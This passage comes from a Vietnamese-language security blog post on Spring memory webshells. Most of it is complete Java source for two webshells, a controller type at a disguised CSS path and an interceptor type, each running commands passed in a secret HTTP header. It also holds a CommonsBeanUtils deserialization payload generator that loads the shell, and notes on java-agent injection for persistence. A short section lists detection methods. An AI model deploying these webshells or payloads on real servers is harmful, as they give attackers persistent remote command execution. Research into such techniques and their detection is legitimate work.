</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, SerializationHandler<span style="color:#f92672">[]</span> handlers)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throws</span> TransletException {}
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#66d9ef">throws</span> TransletException {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">MemTemplatesImpl</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            WebApplicationContext context <span style="color:#f92672">=</span> RequestContextUtils.<span style="color:#a6e22e">findWebApplicationContext</span>(((ServletRequestAttributes) RequestContextHolder.<span style="color:#a6e22e">getRequestAttributes</span>()).<span style="color:#a6e22e">getRequest</span>());
</span></span><span style="display:flex;"><span>            RequestMappingHandlerMapping mappingHandler <span style="color:#f92672">=</span> context.<span style="color:#a6e22e">getBean</span>(RequestMappingHandlerMapping.<span style="color:#a6e22e">class</span>);
</span></span><span style="display:flex;"><span>            Method method <span style="color:#f92672">=</span> MemTemplatesImpl.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getMethod</span>(<span style="color:#e6db74">&#34;run&#34;</span>);
</span></span><span style="display:flex;"><span>            Method getMappingForMethod <span style="color:#f92672">=</span> mappingHandler.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;getMappingForMethod&#34;</span>, Method.<span style="color:#a6e22e">class</span>, Class.<span style="color:#a6e22e">class</span>);
</span></span><span style="display:flex;"><span>            getMappingForMethod.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            RequestMappingInfo mInfo <span style="color:#f92672">=</span> (RequestMappingInfo) getMappingForMethod.<span style="color:#a6e22e">invoke</span>(mappingHandler, method, MemTemplatesImpl.<span style="color:#a6e22e">class</span>);
</span></span><span style="display:flex;"><span>            MemTemplatesImpl obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> MemTemplatesImpl(<span style="color:#e6db74">&#34;a&#34;</span>);
</span></span><span style="display:flex;"><span>            mappingHandler.<span style="color:#a6e22e">registerMapping</span>(mInfo, obj, method);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {}
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">MemTemplatesImpl</span>(String a) {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@RequestMapping</span>(<span style="color:#e6db74">&#34;/a/assets/style.css&#34;</span>) <span style="color:#75715e">// memshell path</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">run</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            HttpServletRequest request <span style="color:#f92672">=</span> ((ServletRequestAttributes)RequestContextHolder.<span style="color:#a6e22e">currentRequestAttributes</span>()).<span style="color:#a6e22e">getRequest</span>();
</span></span><span style="display:flex;"><span>            HttpServletResponse response <span style="color:#f92672">=</span> ((ServletRequestAttributes)RequestContextHolder.<span style="color:#a6e22e">currentRequestAttributes</span>()).<span style="color:#a6e22e">getResponse</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            String arg0 <span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getHeader</span>(<span style="color:#e6db74">&#34;dev_63hdsbxs7hx&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (arg0 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> request.<span style="color:#a6e22e">getMethod</span>().<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;POST&#34;</span>)) {
</span></span><span style="display:flex;"><span>                ProcessBuilder p;
</span></span><span style="display:flex;"><span>                String o <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>                PrintWriter w <span style="color:#f92672">=</span> response.<span style="color:#a6e22e">getWriter</span>();
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (System.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;os.name&#34;</span>).<span style="color:#a6e22e">toLowerCase</span>().<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;win&#34;</span>)) {
</span></span><span style="display:flex;"><span>                    p <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProcessBuilder(<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;cmd.exe&#34;</span>, <span style="color:#e6db74">&#34;/c&#34;</span>, arg0});
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    p <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProcessBuilder(<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, arg0});
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Scanner</span> c <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Scanner</span>(p.<span style="color:#a6e22e">start</span>().<span style="color:#a6e22e">getInputStream</span>()).<span style="color:#a6e22e">useDelimiter</span>(<span style="color:#e6db74">&#34;\\A&#34;</span>);
</span></span><span style="display:flex;"><span>                o <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">hasNext</span>() <span style="color:#f92672">?</span> c.<span style="color:#a6e22e">next</span>() : o;
</span></span><span style="display:flex;"><span>                c.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>                w.<span style="color:#a6e22e">write</span>(o);
</span></span><span style="display:flex;"><span>                w.<span style="color:#a6e22e">flush</span>();
</span></span><span style="display:flex;"><span>                w.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                response.<span style="color:#a6e22e">sendError</span>(404);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {}
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Interceptor type:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> evil;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.context.WebApplicationContext;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.context.request.RequestContextHolder;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.context.request.ServletRequestAttributes;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.HandlerInterceptor;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.ModelAndView;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.handler.MappedInterceptor;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.support.RequestContextUtils;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletRequest;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletResponse;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.PrintWriter;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.List;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">InterceptorTypeTest</span> <span style="color:#66d9ef">extends</span> AbstractTranslet <span style="color:#66d9ef">implements</span> HandlerInterceptor {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, SerializationHandler<span style="color:#f92672">[]</span> handlers)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throws</span> TransletException {}
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#66d9ef">throws</span> TransletException {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">InterceptorTypeTest</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            WebApplicationContext context <span style="color:#f92672">=</span> RequestContextUtils.<span style="color:#a6e22e">findWebApplicationContext</span>(((ServletRequestAttributes) RequestContextHolder.<span style="color:#a6e22e">getRequestAttributes</span>()).<span style="color:#a6e22e">getRequest</span>());
</span></span><span style="display:flex;"><span>            RequestMappingHandlerMapping mappingHandler <span style="color:#f92672">=</span> context.<span style="color:#a6e22e">getBean</span>(RequestMappingHandlerMapping.<span style="color:#a6e22e">class</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            Field adaptedInterceptorsField <span style="color:#f92672">=</span> AbstractHandlerMapping.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;adaptedInterceptors&#34;</span>);
</span></span><span style="display:flex;"><span>            adaptedInterceptorsField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>            List<span style="color:#f92672">&lt;</span>HandlerInterceptor<span style="color:#f92672">&gt;</span>  adaptedInterceptors <span style="color:#f92672">=</span> (List<span style="color:#f92672">&lt;</span>HandlerInterceptor<span style="color:#f92672">&gt;</span>) adaptedInterceptorsField.<span style="color:#a6e22e">get</span>(mappingHandler);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            MappedInterceptor mappedInterceptor <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> MappedInterceptor(<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;/assets/**&#34;</span>}, <span style="color:#66d9ef">new</span> InterceptorTypeTest(<span style="color:#e6db74">&#34;a&#34;</span>));
</span></span><span style="display:flex;"><span>            adaptedInterceptors.<span style="color:#a6e22e">add</span>(mappedInterceptor);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {}
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">InterceptorTypeTest</span>(String a) {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">preHandle</span>(HttpServletRequest request, HttpServletResponse response, Object handler) {
</span></span><span style="display:flex;"><span>        String arg0 <span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getHeader</span>(<span style="color:#e6db74">&#34;X-Cache-Ghdb56&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (arg0 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> request.<span style="color:#a6e22e">getMethod</span>().<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;POST&#34;</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                ProcessBuilder p;
</span></span><span style="display:flex;"><span>                String o <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>                PrintWriter w <span style="color:#f92672">=</span> response.<span style="color:#a6e22e">getWriter</span>();
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (System.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;os.name&#34;</span>).<span style="color:#a6e22e">toLowerCase</span>().<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;win&#34;</span>)) {
</span></span><span style="display:flex;"><span>                    p <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProcessBuilder(<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;cmd.exe&#34;</span>, <span style="color:#e6db74">&#34;/c&#34;</span>, arg0});
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    p <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProcessBuilder(<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, arg0});
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Scanner</span> c <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Scanner</span>(p.<span style="color:#a6e22e">start</span>().<span style="color:#a6e22e">getInputStream</span>()).<span style="color:#a6e22e">useDelimiter</span>(<span style="color:#e6db74">&#34;\\A&#34;</span>);
</span></span><span style="display:flex;"><span>                o <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">hasNext</span>() <span style="color:#f92672">?</span> c.<span style="color:#a6e22e">next</span>() : o;
</span></span><span style="display:flex;"><span>                c.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>                w.<span style="color:#a6e22e">write</span>(o);
</span></span><span style="display:flex;"><span>                w.<span style="color:#a6e22e">flush</span>();
</span></span><span style="display:flex;"><span>                w.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (Exception e) {}
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">postHandle</span>(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) {}
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">afterCompletion</span>(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Method gen payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">genCommonsBeanUtils</span>() <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bArr <span style="color:#f92672">=</span> Files.<span style="color:#a6e22e">readAllBytes</span>(Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;D:\\lab\\java\\spring-boot11\\target\\classes\\evil\\MemTemplatesImpl.class&#34;</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    TemplatesImpl tplsImpl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>    setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{bArr});
</span></span><span style="display:flex;"><span>    setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;ahihi&#34;</span>);
</span></span><span style="display:flex;"><span>    setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    BeanComparator beanComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator();
</span></span><span style="display:flex;"><span>    PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> priorityQueue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(beanComparator);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// replace later</span>
</span></span><span style="display:flex;"><span>    priorityQueue.<span style="color:#a6e22e">add</span>(1);
</span></span><span style="display:flex;"><span>    priorityQueue.<span style="color:#a6e22e">add</span>(1); <span style="color:#75715e">// size = 2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    setFieldValue(beanComparator, <span style="color:#e6db74">&#34;property&#34;</span>, <span style="color:#e6db74">&#34;outputProperties&#34;</span>);
</span></span><span style="display:flex;"><span>    setFieldValue(priorityQueue, <span style="color:#e6db74">&#34;queue&#34;</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{tplsImpl, tplsImpl});
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// test me</span>
</span></span><span style="display:flex;"><span>    String serialized <span style="color:#f92672">=</span> serTest(priorityQueue);
</span></span><span style="display:flex;"><span>    String encoded <span style="color:#f92672">=</span> URLEncoder.<span style="color:#a6e22e">encode</span>(serialized);
</span></span><span style="display:flex;"><span>    System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(encoded);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="via-java-agent">via java agent</h4>
<p>Đã có access vào server, muốn persistent connection. Sử dụng CLI chạy java agent (đã đc package thành <code>.jar</code> file) để load memshell vào app spring đang chạy mong muốn.</p>
<p>ref tạm: <a href="https://github.com/fa1c0n1/JavaInstrument/blob/main/AgentSpringbootMemShellInject/src/main/java/me/mole/AttachApp.java">https://github.com/fa1c0n1/JavaInstrument/blob/main/AgentSpringbootMemShellInject/src/main/java/me/mole/AttachApp.java</a></p>
<h2 id="spring-mvc">Spring MVC</h2>
<p><strong>Version</strong>: <a href="https://mvnrepository.com/artifact/org.springframework/spring-webmvc">https://mvnrepository.com/artifact/org.springframework/spring-webmvc</a></p>
<ul>
<li><code>spring boot 2.x</code> includes <code>spring-webmvc 5.x</code> =&gt; test ok (ko deser đc)</li>
<li><code>spring boot 3.x</code> includes <code>spring-webmvc 6.x</code> =&gt; not ok do jdk ver cao</li>
</ul>
<h2 id="detection">Detection</h2>
<ul>
<li>Như tomcat sẽ scan các components như listener, filter, servlet trong JVM process và tìm các class đáng nghi khi sử dụng một số class như classloader, Runtime, ProcessBuilder, reflection gọi method nhạy cảm,&hellip; dựa vào bytecode - tương tự Spring sẽ dựa vào components như controller, interceptor.</li>
<li>VisualVM qua JMX service</li>
<li>Ngoài ra detect dựa vào các keyword đáng nghi như <code>shell</code>, <code>inject</code>, <code>exploit</code>,&hellip;</li>
<li>Như tomcat có thể up jsp memshell-scanner để detect hoặc chạy agent, spring chỉ có thể chạy agent.</li>
<li>RASP (Runtime Application self-protection)</li>
<li>Anti detect &hellip;.</li>
</ul>
<h2 id="notes">Notes</h2>
<p>For servlet stack applications, the spring-boot-starter-web includes Tomcat by including spring-boot-starter-tomcat, but you can use spring-boot-starter-jetty or spring-boot-starter-undertow instead.
=&gt; spring boot có tomcat embeded; spring mvc chạy trên tomcat</p>
<p>Do trong compile time chưa import lib của tomcat nên lỗi (deploy mới push lên tomcat, ko phải embeded như spring boot): <a href="https://stackoverflow.com/questions/22756153/the-superclass-javax-servlet-http-httpservlet-was-not-found-on-the-java-build">https://stackoverflow.com/questions/22756153/the-superclass-javax-servlet-http-httpservlet-was-not-found-on-the-java-build</a></p>
<p>Một Interceptor sẽ implement từ <code>org.springframework.web.servlet.HandlerInterceptor</code> (trong Spring MVC &gt;= <code>5.3</code>, với version trước đó cần extends từ <code>org.springframework.web.servlet.HandlerInterceptorAdaptor</code>)</p>
<h2 id="tổng-kết">Tổng kết</h2>
<ul>
<li>Spring boot 2.x memshell ok, via SpEL injection + deserialize</li>
<li>Spring boot 3.x not ok do jdk ver cao (từ jdk 16 bị nhiều giới hạn, đọc jdk16/JEP 396)</li>
<li>Spring MVC 5.x ~ Spring boot 2.x memshell ok, via SpEL injection - chưa mò vì sao deser lỗi</li>
<li>Spring MVC 6.x ~ Spring boot 3.x not ok tương dự do jdk ver cao</li>
</ul>
<p><strong>jdk16/JEP 396</strong> ==&gt; <a href="https://code-white.com/blog/2023-04-java-exploitation-restrictions-in-modern-jdk-times/">https://code-white.com/blog/2023-04-java-exploitation-restrictions-in-modern-jdk-times/</a></p>
<ul>
<li>Lý do mình tìm hiểu memshell controller type là do thường nó sẽ stable hơn, tuy nhiên sử dụng controller type cũng có nhiều giới hạn ví dụ nếu app yêu cầu mọi routes phải authen thì shell cũng phải authen mới xài được. Có thể workaround bằng cách dùng interceptor type, tham khảo: <a href="https://blog.csdn.net/mole_exp/article/details/123992395">https://blog.csdn.net/mole_exp/article/details/123992395</a></li>
</ul>

    </div>
  </article>

  
  






  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/posts">Archives</a></li>
         
          <li><a href="/tags">Tags</a></li>
         
          <li><a href="/about">About</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#preface">Preface</a></li>
    <li><a href="#spring-boot">Spring boot</a>
      <ul>
        <li><a href="#dynamically-set-requestmappings-in-spring-at-runtime">Dynamically set RequestMappings in Spring (at runtime)</a></li>
        <li><a href="#code-injection-load-memshell">Code injection (load memshell)</a></li>
      </ul>
    </li>
    <li><a href="#spring-mvc">Spring MVC</a></li>
    <li><a href="#detection">Detection</a></li>
    <li><a href="#notes">Notes</a></li>
    <li><a href="#tổng-kết">Tổng kết</a></li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f&text=Quick%20Note%20Spring%20Memshell" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f&title=Quick%20Note%20Spring%20Memshell" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f&is_video=false&description=Quick%20Note%20Spring%20Memshell" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Quick%20Note%20Spring%20Memshell&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f&title=Quick%20Note%20Spring%20Memshell" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f&title=Quick%20Note%20Spring%20Memshell" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f&name=Quick%20Note%20Spring%20Memshell&description=Preface%20M%e1%bb%99t%20v%c3%a0i%20m%e1%ba%abu%20note%20r%e1%bb%9di%20r%e1%ba%a1c%20v%e1%bb%81%20spring%20memory%20webshell%20m%c3%a0%20m%c3%acnh%20%c4%91%c3%a3%20d%c3%a0nh%20th%e1%bb%9di%20gian%20t%c3%acm%20hi%e1%bb%83u%20ch%c6%b0a%20c%c3%b3%20th%e1%bb%9di%20gian%20vi%e1%ba%bft%20ho%c3%a0n%20thi%e1%bb%87n%0aSpring%20boot%20Maven%3a%20https%3a%2f%2fmvnrepository.com%2fartifact%2forg.springframework.boot%2fspring-boot-starter-web%0aspring%20boot%20%26lt%3b%202.x%20%3d%26gt%3b%20test%20ok%20%282.4.10%2c%202.5.14%2c%202.7.15%29%20spring%20boot%203.x%20%28support%20jdk%20%26gt%3b%3d%2017%29%20%3d%26gt%3b%20not%20ok%20do%20jdk%20ver%20cao%20Dynamically%20set%20RequestMappings%20in%20Spring%20%28at%20runtime%29%20L%e1%ba%a5y%20WebApplicationContext%20Key%20khi%20inject%20memshell%20trong%20spring%20l%c3%a0%20l%e1%ba%a5y%20%c4%91%c6%b0%e1%bb%a3c%20WebApplicationContext" aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f&t=Quick%20Note%20Spring%20Memshell" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2024  devme4f blogs 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/tags">Tags</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
